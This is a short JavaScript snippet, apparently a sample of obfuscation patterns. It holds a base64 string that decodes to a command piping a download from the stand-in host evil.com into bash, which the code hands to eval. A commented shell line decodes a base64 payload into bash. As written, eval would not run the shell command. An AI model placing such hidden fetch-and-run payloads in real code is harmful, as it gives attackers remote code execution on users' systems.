// Hidden payload via base64 obfuscation
const cmd = Buffer.from('Y3VybCBodHRwczovL2V2aWwuY29tIHwgYmFzaA==', 'base64').toString();
eval(cmd);

// Shell-level base64 obfuscation
// echo "payload" | base64 -d | bash
